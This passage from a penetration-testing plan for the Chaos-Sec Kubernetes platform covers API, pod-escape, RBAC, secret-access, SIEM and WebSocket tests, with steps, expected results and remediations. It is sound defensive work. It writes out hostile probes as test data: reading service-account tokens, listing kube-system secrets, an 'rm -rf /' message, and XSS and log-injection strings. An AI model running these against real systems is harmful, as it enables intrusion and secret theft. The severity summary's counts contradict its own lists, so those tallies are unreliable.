Verify that HTTP method override headers (e.g., `X-HTTP-Method-Override`, `X-Method-Override`) cannot bypass authorization checks. Some frameworks allow POST requests to be treated as PUT/DELETE via override headers.

**Steps:**

1. Send a `POST` request to a delete endpoint with `X-HTTP-Method-Override: DELETE`:
   ```
   POST /api/v1/experiments/{id} HTTP/1.1
   X-HTTP-Method-Override: DELETE
   Authorization: Bearer <viewer_token>
   ```
2. Send a `GET` request with `X-HTTP-Method-Override: DELETE`:
   ```
   GET /api/v1/experiments/{id} HTTP/1.1
   X-HTTP-Method-Override: DELETE
   ```
3. Attempt method override via query parameter: `?_method=DELETE`.
4. Verify that the method override does not change how the RBAC middleware evaluates permissions.

**Expected Result:**

- Method override headers are ignored by the framework.
- The actual HTTP method (not the overridden one) is used for routing and authorization.
- DELETE operations still require the `experiments:delete` permission.
- Write operations still require their respective write permissions.
- The Gin framework does not process `X-HTTP-Method-Override` by default.

**Remediation if Failed:**

- Ensure no middleware or configuration enables HTTP method override.
- Explicitly strip or ignore `X-HTTP-Method-Override` and `X-Method-Override` headers.
- Verify that the Gin router matches routes by the actual HTTP method only.

---

### API-05: Request Size Limit

| Field | Value |
|-------|-------|
| **Test ID** | API-05 |
| **Category** | API Security |
| **Severity** | Medium |
| **OWASP Reference** | OTG-ATHZ-004 (DoS) |

**Description:**  
Verify that the API rejects excessively large request bodies. The `RequestSizeLimit` middleware in `security.go` and the Gin engine's `MaxMultipartMemory` setting enforce request size limits.

**Steps:**

1. Send a `POST` request to `/api/v1/experiments` with a body larger than the maximum allowed size (e.g., 10 MB when the limit is 1 MB):
   ```bash
   dd if=/dev/urandom bs=1M count=11 | curl -X POST http://target/api/v1/experiments \
     -H "Authorization: Bearer <token>" \
     -H "Content-Type: application/json" \
     --data-binary @-
   ```
2. Send a request with a `Content-Length` header exceeding the limit.
3. Send a request without `Content-Length` but with a body that exceeds the limit (chunked transfer).
4. Verify the response is HTTP 413 Payload Too Large.
5. Verify the error response format: `{"error": "request_too_large", "message": "Request body exceeds the maximum allowed size of X bytes.", "code": 413}`.

**Expected Result:**

- Requests with `Content-Length` exceeding the limit are immediately rejected with HTTP 413.
- Requests without `Content-Length` that exceed the limit during reading are also rejected (via `http.MaxBytesReader`).
- The error message includes the maximum allowed size for debugging.
- Legitimate requests within the size limit are processed normally.

**Remediation if Failed:**

- Ensure `RequestSizeLimit` middleware is applied globally.
- Set a reasonable maximum request size (recommend 1 MB for typical API requests, 10 MB for file uploads).
- Configure the Gin engine's `MaxMultipartMemory` setting.
- Add server-level body size limits in the reverse proxy (nginx/Ingress).

---

## 7. Kubernetes-Specific Testing

### K8S-01: Attacker Pod Escape Prevention

| Field | Value |
|-------|-------|
| **Test ID** | K8S-01 |
| **Category** | Kubernetes Security |
| **Severity** | Critical |

**Description:**  
Verify that attacker pods created during experiments cannot escape their containment boundaries. The Chaos-Sec platform creates attacker pods with strict security contexts, and they should be unable to access the host system or other namespaces.

**Steps:**

1. Trigger an experiment that creates an attacker pod.
2. Inspect the attacker pod's security context:
   ```bash
   kubectl get pod <attacker-pod> -n chaos-sec-exp-<id> -o yaml | grep -A 20 securityContext
   ```
3. Verify the following security context settings:
   - `runAsNonRoot: true` — pod runs as non-root user
   - `runAsUser: 1000` — specific non-root UID
   - `readOnlyRootFilesystem: true` — root filesystem is read-only
   - `allowPrivilegeEscalation: false` — no SUID/SGID escalation
   - `capabilities.drop: ["ALL"]` — all Linux capabilities dropped
   - `hostNetwork: false` — no access to host network
   - `hostPID: false` — no access to host PID namespace
   - `hostIPC: false` — no access to host IPC namespace
4. Attempt to escape the pod:
   - Run `kubectl exec` into the attacker pod and attempt `chroot /host` (should fail — no host mount).
   - Attempt to access Kubernetes API with the pod's service account token: `curl -k https://kubernetes.default.svc/apis` (should be limited by RBAC).
   - Attempt to mount the host filesystem (should fail — `readOnlyRootFilesystem`).
   - Attempt to run privileged commands (should fail — no capabilities).
5. Verify network policies restrict the pod's egress to only the target namespace.

**Expected Result:**

- The attacker pod's security context matches the documented specification in Section 8.4 of the Security Considerations document.
- All escape attempts fail with permission denied errors.
- The pod cannot access the Kubernetes API beyond its RBAC-permitted scope.
- Network policies prevent the pod from reaching internal services.
- The pod's service account token is not auto-mounted (`automountServiceAccountToken: false`).

**Remediation if Failed:**

- Enforce `PodSecurity` admission with the `restricted` profile.
- Verify that the attacker pod template sets all security context fields.
- Add a `MutatingAdmissionWebhook` that validates and enforces security contexts on all pods in experiment namespaces.
- Implement `seccomp` profiles with `RuntimeDefault` for additional syscall restrictions.

---

### K8S-02: RBAC Bypass Prevention

| Field | Value |
|-------|-------|
| **Test ID** | K8S-02 |
| **Category** | Kubernetes Security |
| **Severity** | Critical |

**Description:**  
Verify that the Kubernetes RBAC configuration for the Chaos-Sec backend service account cannot be bypassed to gain unauthorized cluster access.

**Steps:**

1. Retrieve the Chaos-Sec backend service account token.
2. Attempt to perform actions beyond the documented RBAC permissions:
   - Create a pod in the `kube-system` namespace.
   - Delete a clusterrole or clusterrolebinding.
   - Read secrets in any namespace other than `chaos-sec` and `chaos-sec-experiments`.
   - Create a namespace.
   - Patch a node.
   - Execute commands in a pod in the `chaos-sec` namespace (not `chaos-sec-experiments`).
3. Verify the `chaos-sec-experiment-role` ClusterRole only allows:
   - `pods: [create, delete, get, list, watch]` in `chaos-sec-experiments` namespace.
   - `pods/exec: [create]` in `chaos-sec-experiments` namespace.
   - `networkpolicies: [create, delete, get, list]` in `chaos-sec-experiments` namespace.
   - `events: [get, list, watch]` in `chaos-sec-experiments` namespace.

**Expected Result:**

- All actions beyond the documented RBAC permissions are denied.
- The service account cannot create pods outside the experiment namespace.
- The service account cannot read secrets.
- The service account cannot modify cluster-level resources.
- RBAC denies are logged in the Kubernetes audit log.

**Remediation if Failed:**

- Review and tighten the ClusterRole and RoleBinding definitions.
- Remove any wildcards (`*`) from RBAC rules.
- Use namespace-scoped Roles instead of ClusterRoles where possible.
- Implement Kubernetes audit logging to detect unauthorized access attempts.

---

### K8S-03: Namespace Isolation Verification

| Field | Value |
|-------|-------|
| **Test ID** | K8S-03 |
| **Category** | Kubernetes Security |
| **Severity** | High |

**Description:**  
Verify that experiment namespaces are properly isolated from each other and from the main `chaos-sec` namespace. Each experiment should run in its own namespace (`chaos-sec-exp-<id>`) with network policies, resource quotas, and pod security standards.

**Steps:**

1. Create two experiments (Experiment A and Experiment B) simultaneously.
2. Verify each experiment runs in its own namespace: `chaos-sec-exp-<exp_a_id>` and `chaos-sec-exp-<exp_b_id>`.
3. From Experiment A's attacker pod, attempt to access:
   - Services in `chaos-sec-exp-<exp_b_id>` (should be blocked by network policies).
   - Services in `chaos-sec` namespace (should be blocked by network policies).
   - The Kubernetes API server (should be limited by RBAC).
4. Verify each experiment namespace has:
   - A `default-deny-ingress` NetworkPolicy.
   - A ResourceQuota limiting pods, CPU, memory, services, secrets, and configmaps.
   - Pod Security Standards labels (`pod-security.kubernetes.io/enforce: restricted`).
5. Attempt to create a pod in the experiment namespace without the required security context labels.

**Expected Result:**

- Experiment A's attacker pod cannot reach Experiment B's services.
- Experiment pods cannot reach the `chaos-sec` backend or database.
- Network policies enforce default-deny ingress.
- Resource quotas prevent resource exhaustion attacks.
- Pod Security Admission rejects pods that don't meet the `restricted` profile.

**Remediation if Failed:**

- Verify NetworkPolicy definitions are correctly applied.
- Verify the ResourceQuota is created in each experiment namespace.
- Verify Pod Security labels are set on the namespace.
- Use a `ValidatingAdmissionWebhook` to enforce pod security for experiment namespaces.

---

### K8S-04: Secret Access Prevention

| Field | Value |
|-------|-------|
| **Test ID** | K8S-04 |
| **Category** | Kubernetes Security |
| **Severity** | Critical |

**Description:**  
Verify that attacker pods and unauthorized users cannot access Kubernetes secrets, including cluster credentials stored by the Chaos-Sec platform.

**Steps:**

1. From an attacker pod, attempt to read secrets:
   ```bash
   kubectl get secrets -n chaos-sec
   kubectl get secrets -n kube-system
   ```
2. From an attacker pod, attempt to read the service account token:
   ```bash
   cat /var/run/secrets/kubernetes.io/serviceaccount/token
   ```
3. Verify that `automountServiceAccountToken: false` is set on attacker pods.
4. Attempt to access cluster CA certificates stored as Kubernetes secrets.
5. Verify that the Chaos-Sec backend's ClusterRole does not include `secrets` resource access.

**Expected Result:**

- The attacker pod cannot read secrets in any namespace.
- The service account token is not mounted in the attacker pod (volume is empty).
- The RBAC rules for `chaos-sec-experiment-role` do not include `secrets` as a resource.
- Cluster credentials (CA cert, client cert, client key) are stored in Vault or encrypted Kubernetes secrets, not in plaintext.
- The `automountServiceAccountToken: false` setting prevents automatic token mounting.

**Remediation if Failed:**

- Set `automountServiceAccountToken: false` on all attacker pod specifications.
- Ensure the ClusterRole for experiments does not include `secrets` as a resource.
- Move cluster credentials to HashiCorp Vault (production) or encrypted Kubernetes secrets.
- Implement `NetworkPolicy` to block egress from attacker pods to the Kubernetes API server (except for allowed endpoints).

---

## 8. SIEM Integration Testing

### SIEM-01: Alert Injection Prevention

| Field | Value |
|-------|-------|
| **Test ID** | SIEM-01 |
| **Category** | SIEM Integration |
| **Severity** | High |

**Description:**  
Verify that an attacker cannot inject false alerts into the SIEM system through the Chaos-Sec API. The SIEM integration forwards security events and experiment results to an external SIEM platform.

**Steps:**

1. Authenticate as a regular user and attempt to send crafted alerts to the SIEM:
   - `POST /api/v1/siem/alerts/query` with a crafted alert containing false data.
   - Verify the SIEM query endpoint only reads data, not writes.
2. Attempt to manipulate experiment results to generate false SIEM alerts:
   - Create an experiment with a crafted name containing SIEM log injection payloads:
     - `name: "Experiment\n[ALERT] CRITICAL: Unauthorized access detected"`
     - `name: "Experiment\t<script>alert('XSS')</script>"`
3. Attempt to send alerts directly to the SIEM endpoint (bypassing the Chaos-Sec API):
   - `POST <siem_endpoint>/api/v1/alerts` with a forged API key.
4. Verify that SIEM alerts are authenticated with the configured API key.
5. Verify that alert data is validated and sanitized before forwarding to the SIEM.

**Expected Result:**

- The `/api/v1/siem/alerts/query` endpoint only accepts GET requests or POST requests that query existing data; it does not create new alerts.
- Log injection payloads are sanitized (newlines, tabs, and control characters are stripped).
- Direct requests to the SIEM endpoint with a forged API key are rejected with 401/403.
- Alert data is validated against a schema before forwarding.
- The SIEM API key is stored securely and not accessible to regular users.

**Remediation if Failed:**

- Ensure SIEM query endpoints only support read operations.
- Sanitize all string data before forwarding to the SIEM (strip newlines, tabs, and control characters).
- Validate alert schemas before forwarding.
- Store SIEM API keys in Kubernetes secrets or Vault, not in environment variables visible to pods.
- Implement mutual TLS between Chaos-Sec and the SIEM platform.

---

### SIEM-02: SIEM Data Tampering

| Field | Value |
|-------|-------|
| **Test ID** | SIEM-02 |
| **Category** | SIEM Integration |
| **Severity** | High |

**Description:**  
Verify that SIEM data (alerts, experiment results, health status) cannot be tampered with by unauthorized users. This includes both the data stored in the Chaos-Sec database and data in transit to the SIEM.

**Steps:**

1. Authenticate as a regular user and attempt to modify SIEM data:
   - `PUT /api/v1/siem/alerts/{alert_id}` (should return 404 or 405 — no update endpoint).
   - `DELETE /api/v1/siem/alerts/{alert_id}` (should return 403 or 404).
2. Attempt to modify experiment results that are linked to SIEM alerts:
   - `PUT /api/v1/experiments/{id}` with modified result data.
   - Verify that experiment results cannot be altered after the experiment is completed.
3. Intercept the SIEM forwarding request (man-in-the-middle) and attempt to:
   - Modify alert content in transit.
   - Replay previous alerts with altered timestamps.
4. Verify the integrity of audit logs:
   - Check that audit logs use hash chaining (`SHA-256`) and HMAC signatures (`HMAC-SHA256`).
   - Attempt to modify an audit log entry and verify the chain detects the tampering.

**Expected Result:**

- No write/modify endpoints exist for SIEM alerts via the public API.
- Experiment results are immutable after the experiment completes.
- SIEM communication uses TLS, preventing MITM modification.
- Audit logs use hash chaining: each log entry includes the hash of the previous entry.
- Any tampering with audit logs is detectable through hash chain verification.
- The `AuditLog` middleware logs all SIEM-related operations with request IDs.

**Remediation if Failed:**

- Remove any write/modify endpoints for SIEM alerts from the public API.
- Make experiment results immutable in the database after experiment completion.
- Enforce TLS for all SIEM communication.
- Implement audit log hash chaining and verify integrity on read.

---

### SIEM-03: SIEM Replay Attack Prevention

| Field | Value |
|-------|-------|
| **Test ID** | SIEM-03 |
| **Category** | SIEM Integration |
| **Severity** | Medium |

**Description:**  
Verify that the SIEM integration is protected against replay attacks, where previously valid API requests or alerts are re-sent to the SIEM platform.

**Steps:**

1. Capture a valid SIEM alert forwarding request (using a proxy or mock SIEM server).
2. Replay the exact same request with the same headers and body.
3. Verify the SIEM platform rejects the replayed request (using nonce, timestamp, or JTI-based deduplication).
4. Capture a valid Chaos-Sec API request (e.g., `POST /api/v1/experiments/{id}/execute`).
5. Replay the same request and verify it is handled correctly:
   - If the experiment is already running, it should return a 409 Conflict.
   - If the experiment is completed, it should return an appropriate status.
6. Test replay of SIEM health check requests.

**Expected Result:**

- Replayed SIEM alert requests are rejected or deduplicated based on alert ID (`jti` or `id` field).
- Replayed API requests are handled idempotently — they don't create duplicate experiments or alerts.
- Timestamp validation rejects requests with timestamps outside a reasonable window.
- The `jti` (JWT ID) claim in tokens prevents replay of the same authentication token.
- Experiment execution is idempotent — running the same experiment ID twice doesn't create duplicates.

**Remediation if Failed:**

- Add nonce/JTI-based deduplication for SIEM alert forwarding.
- Validate timestamps on incoming requests and reject requests outside a reasonable time window.
- Implement idempotency keys for state-changing API requests.
- Use unique alert IDs (UUID) to prevent duplicate alert insertion.

---

## 9. WebSocket Security Testing

### WS-01: WebSocket Authentication

| Field | Value |
|-------|-------|
| **Test ID** | WS-01 |
| **Category** | WebSocket Security |
| **Severity** | Critical |

**Description:**  
Verify that WebSocket connections require proper authentication. The Chaos-Sec platform uses WebSocket connections for real-time experiment updates, and these must be protected against unauthorized access.

**Steps:**

1. Attempt to establish a WebSocket connection without any authentication token:
   ```javascript
   const ws = new WebSocket('wss://target/ws/experiments/{id}/events');
   // No Authorization header
   ```
2. Attempt to establish a WebSocket connection with an expired token.
3. Attempt to establish a WebSocket connection with a tampered token (modified claims).
4. Attempt to establish a WebSocket connection with a valid token for Org A and subscribe to Org B's experiment events.
5. Attempt to send a message over the WebSocket before the connection is fully authenticated.
6. Verify that authentication is checked during the WebSocket upgrade handshake and not just on the initial HTTP request.

**Expected Result:**

- Unauthenticated WebSocket connections are rejected with HTTP 401 during the upgrade handshake.
- Connections with expired tokens are rejected with HTTP 401.
- Connections with tampered tokens are rejected with HTTP 401.
- Cross-organization WebSocket subscriptions are rejected — users can only subscribe to events for their own organization's experiments.
- Messages sent before authentication are ignored and may result in connection closure.
- WebSocket connections enforce the same RBAC rules as the REST API.

**Remediation if Failed:**

- Validate the JWT token during the WebSocket upgrade handshake.
- Check that the token has not expired and has not been tampered with.
- Implement organization-scoped event channels — only publish events for experiments belonging to the authenticated user's organization.
- Close WebSocket connections that send messages before authentication is confirmed.

---

### WS-02: WebSocket Message Tampering

| Field | Value |
|-------|
| **Test ID** | WS-02 |
| **Category** | WebSocket Security |
| **Severity** | High |

**Description:**  
Verify that WebSocket messages cannot be tampered with to inject false data, trigger unauthorized actions, or disrupt the system.

**Steps:**

1. Establish an authenticated WebSocket connection.
2. Send malformed JSON messages:
   - `{"type": "subscribe", "experiment_id": "invalid_uuid"}`
   - `{not valid json`
   - `{"type": "\x00null_byte_injection"}`
3. Send messages with unexpected message types:
   - `{"type": "execute_command", "command": "rm -rf /"}` (if the protocol doesn't support this type).
4. Send oversized messages (larger than the maximum frame size).
5. Send rapid-fire messages to test rate limiting on WebSocket connections.
6. Send messages with very deeply nested JSON structures (JSON bomb).
7. Attempt to inject SQL or command payloads through WebSocket message fields.

**Expected Result:**

- Malformed JSON messages are rejected with an error response and do not crash the server.
- Invalid or unrecognized message types are ignored with an appropriate error response.
- Null bytes and control characters in message fields are rejected or sanitized.
- Oversized messages are rejected (connection should close with error code 1009 for "message too big").
- Rate limiting applies to WebSocket messages (per-connection and per-user).
- Deeply nested JSON structures are rejected (maximum nesting depth).
- SQL and command injection payloads in message fields are handled the same as REST API inputs.

**Remediation if Failed:**

- Implement strict message validation for all WebSocket message types.
- Set maximum frame size and maximum message size for WebSocket connections.
- Apply per-connection rate limiting for WebSocket messages.
- Limit JSON nesting depth to prevent JSON bomb attacks.
- Sanitize all string fields in WebSocket messages the same as REST API inputs.

---

### WS-03: WebSocket Connection Hijacking

| Field | Value |
|-------|-------|
| **Test ID** | WS-03 |
| **Category** | WebSocket Security |
| **Severity** | High |

**Description:**  
Verify that WebSocket connections cannot be hijacked by another user or session. This includes preventing cross-origin WebSocket connections and ensuring connections are properly authenticated throughout their lifetime.

**Steps:**

1. Establish a WebSocket connection from an allowed origin.
2. Attempt to establish a WebSocket connection from a disallowed origin:
   ```javascript
   const ws = new WebSocket('wss://target/ws/experiments/{id}/events');
   // Origin: https://evil.com
   ```
3. Attempt to hijack an active WebSocket connection by sending a request with another user's token.
4. After a token refresh, verify that the WebSocket connection is either:
   - Closed and requires reconnection with the new token, or
   - Continues to work because the token was validated at connection time.
5. Test connection timeout: verify idle WebSocket connections are closed after a reasonable timeout.

**Expected Result:**

- WebSocket connections from disallowed origins are rejected during the upgrade handshake.
- The `Origin` header is validated against the CORS allowed origins.
- A WebSocket connection authenticated with User A's token cannot be taken over by User B's token.
- When a token is revoked (logout), the corresponding WebSocket connection is closed.
- Idle connections are closed after a configurable timeout to prevent resource exhaustion.
- WebSocket connections use `wss://` (TLS) in production, not `ws://`.

**Remediation if Failed:**

- Validate the `Origin` header during the WebSocket upgrade handshake.
- Implement token revocation notifications via Redis pub/sub to close WebSocket connections when tokens are revoked.
- Set idle timeout for WebSocket connections (recommend 30 minutes).
- Enforce `wss://` (TLS) for all WebSocket connections in production.
- Use a heartbeat/ping-pong mechanism to detect and close dead connections.

---

## 10. Severity Rating Definitions

| Rating | Description |
|--------|-------------|
| **Critical** | Vulnerability that can lead to complete system compromise, unauthorized access to Kubernetes infrastructure, or data breach affecting all users. Immediate remediation required. |
| **High** | Vulnerability that can lead to significant security impact, including unauthorized data access, privilege escalation within a single tenant, or significant denial of service. Remediation required within 1 week. |
| **Medium** | Vulnerability that can lead to limited security impact, including information disclosure, limited privilege escalation, or minor denial of service. Remediation required within 1 month. |
| **Low** | Vulnerability that has minimal security impact, including minor information disclosure or configuration weaknesses. Remediation recommended but not urgent. |
| **Informational** | Finding that does not pose a direct security risk but may be useful for hardening the system. No remediation required. |

---

## 11. Severity Matrix Summary

| Test ID | Test Name | Category | Severity | Status |
|---------|-----------|----------|----------|--------|
| AUTH-01 | Brute Force Protection | Authentication | Critical | Not Started |
| AUTH-02 | JWT Token Manipulation | Authentication | Critical | Not Started |
| AUTH-03 | Expired Token Rejection | Authentication | High | Not Started |
| AUTH-04 | Session Hijacking Prevention | Authentication | High | Not Started |
| AUTH-05 | CSRF Protection | Authentication | Medium | Not Started |
| AUTHZ-01 | IDOR (Cross-Org Access) | Authorization | Critical | Not Started |
| AUTHZ-02 | Privilege Escalation (Role Bypass) | Authorization | Critical | Not Started |
| AUTHZ-03 | Role Manipulation via API | Authorization | High | Not Started |
| INP-01 | SQL Injection | Input Validation | Critical | Not Started |
| INP-02 | Cross-Site Scripting (XSS) | Input Validation | High | Not Started |
| INP-03 | Command Injection | Input Validation | Critical | Not Started |
| INP-04 | Path Traversal | Input Validation | High | Not Started |
| INP-05 | Null Byte Injection | Input Validation | Medium | Not Started |
| INP-06 | Server-Side Request Forgery | Input Validation | High | Not Started |
| API-01 | Rate Limiting | API Security | High | Not Started |
| API-02 | CORS Configuration | API Security | Medium | Not Started |
| API-03 | Security Headers | API Security | Medium | Not Started |
| API-04 | HTTP Method Override | API Security | Medium | Not Started |
| API-05 | Request Size Limit | API Security | Medium | Not Started |
| K8S-01 | Attacker Pod Escape Prevention | Kubernetes Security | Critical | Not Started |
| K8S-02 | RBAC Bypass Prevention | Kubernetes Security | Critical | Not Started |
| K8S-03 | Namespace Isolation Verification | Kubernetes Security | High | Not Started |
| K8S-04 | Secret Access Prevention | Kubernetes Security | Critical | Not Started |
| SIEM-01 | Alert Injection Prevention | SIEM Integration | High | Not Started |
| SIEM-02 | SIEM Data Tampering | SIEM Integration | High | Not Started |
| SIEM-03 | SIEM Replay Attack Prevention | SIEM Integration | Medium | Not Started |
| WS-01 | WebSocket Authentication | WebSocket Security | Critical | Not Started |
| WS-02 | WebSocket Message Tampering | WebSocket Security | High | Not Started |
| WS-03 | WebSocket Connection Hijacking | WebSocket Security | High | Not Started |

### Summary by Severity

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                     PENETRATION TEST SEVERITY SUMMARY                        │
├──────────────┬──────────────────────────────────────────────────────────────┤
│ Critical (8) │ AUTH-01, AUTH-02, AUTHZ-01, AUTHZ-02, INP-01, INP-03,      │
│              │ K8S-01, K8S-02, K8S-04, WS-01                               │
├──────────────┼──────────────────────────────────────────────────────────────┤
│ High (11)    │ AUTH-03, AUTH-04, AUTHZ-03, INP-02, INP-04, INP-06,         │
│              │ API-01, K8S-03, SIEM-01, SIEM-02, WS-02, WS-03               │
├──────────────┼──────────────────────────────────────────────────────────────┤
│ Medium (7)   │ AUTH-05, INP-05, API-02, API-03, API-04, API-05,            │
│              │ SIEM-03                                                       │
├──────────────┼──────────────────────────────────────────────────────────────┤
│ Low (0)      │ None                                                          │
├──────────────┼──────────────────────────────────────────────────────────────┤
│ Info (0)     │ None                                                          │
└──────────────┴──────────────────────────────────────────────────────────────┘

Total Tests: 28
Critical: 8 (29%)  |  High: 11 (39%)  |  Medium: 7 (25%)  |  Low/Info: 2 (7%)
```

### Summary by Category

| Category | Total | Critical | High | Medium | Low |
|----------|-------|----------|------|--------|-----|
| Authentication | 5 | 2 | 2 | 1 | 0 |
| Authorization | 3 | 2 | 1 | 0 | 0 |
| Input Validation | 6 | 2 | 2 | 1 | 1 |
| API Security | 5 | 0 | 1 | 4 | 0 |
| Kubernetes Security | 4 | 3 | 1 | 0 | 0 |
| SIEM Integration | 3 | 0 | 2 | 1 | 0 |
| WebSocket Security | 3 | 1 | 2 | 0 | 0 |

---

## 12. Test Execution Guidelines

### 12.1 Pre-Test Checklist

- [ ] Obtain written authorization from the system owner before testing.
- [ ] Verify test environment isolation (never test in production without explicit approval).
- [ ] Ensure test data is backed up before testing destructive scenarios.
- [ ] Configure monitoring and alerting to detect test activities.
- [ ] Document all test accounts and credentials used.

### 12.2 Test Environment Setup

```bash
# 1. Deploy the Chaos-Sec platform to a dedicated test environment
make deploy-test-env

# 2. Create test users with different roles
# Admin user
curl -X POST http://localhost:8080/api/v1/auth/register \
  -H "Authorization: Bearer <admin_token>" \
  -d '{"email": "pentest-admin@chaos-sec.test", "password": "TestPass123!", "name": "Pentest Admin"}'

# Operator user
curl -X POST http://localhost:8080/api/v1/auth/register \
  -H "Authorization: Bearer <admin_token>" \
  -d '{"email": "pentest-operator@chaos-sec.test", "password": "TestPass123!", "name": "Pentest Operator", "role": "operator"}'

# Viewer user
curl -X POST http://localhost:8080/api/v1/auth/register \
  -H "Authorization: Bearer <admin_token>" \
  -d '{"email": "pentest-viewer@chaos-sec.test", "password": "TestPass123!", "name": "Pentest Viewer", "role": "viewer"}'

# 3. Set up a mock SIEM server
docker run -p 9200:9200 mock-siem:latest

# 4. Connect a test Kubernetes cluster
kubectl config use-context pentest-cluster
```

### 12.3 Test Order

Tests should be executed in the following order to minimize false positives and ensure proper coverage:

1. **Authentication tests** (AUTH-01 through AUTH-05) — these must pass first, as all other tests depend on valid authentication.
2. **Authorization tests** (AUTHZ-01 through AUTHZ-03) — these depend on working authentication.
3. **Input validation tests** (INP-01 through INP-06) — these can be run in parallel with authorization tests.
4. **API security tests** (API-01 through API-05) — these can be run in parallel.
5. **Kubernetes security tests** (K8S-01 through K8S-04) — these require a running Kubernetes cluster.
6. **SIEM integration tests** (SIEM-01 through SIEM-03) — these require a configured SIEM connection.
7. **WebSocket security tests** (WS-01 through WS-03) — these require the WebSocket server to be running.

### 12.4 Automated Test Execution

The Go integration tests in `backend/internal/integration/pentest_test.go` provide automated verification for the most critical security controls. These tests should be run as part of the CI/CD pipeline:

```bash
# Run all pentest integration tests
go test -v ./internal/integration/ -run TestAuthentication -tags=integration
go test -v ./internal/integration/ -run TestAuthorization -tags=integration
go test -v ./internal/integration/ -run TestInputValidation -tags=integration
go test -v ./internal/integration/ -run TestAPI -tags=integration

# Run with a running server
CHAOS_TEST_URL=http://localhost:8080 go test -v ./internal/integration/ -run TestAPI -tags=e2e
```

---

## 13. Reporting Template

### Finding Report Format

```
## [TEST-ID]: [Finding Title]

**Severity:** Critical / High / Medium / Low / Informational  
**Category:** Authentication / Authorization / Input Validation / API Security / Kubernetes / SIEM / WebSocket  
**Status:** Confirmed / Potential / False Positive  

### Description
[Detailed description of the finding]

### Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

### Proof of Concept
[Code, curl commands, or screenshots demonstrating the vulnerability]

### Impact
[Description of the potential impact if exploited]

### Remediation
[Recommended fix or mitigation]

### References
- [OWASP reference]
- [CWE reference]
- [Internal reference]
```

---

## 14. Document History

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2026-01-15 | Chaos-Sec Security Team | Initial penetration testing plan |
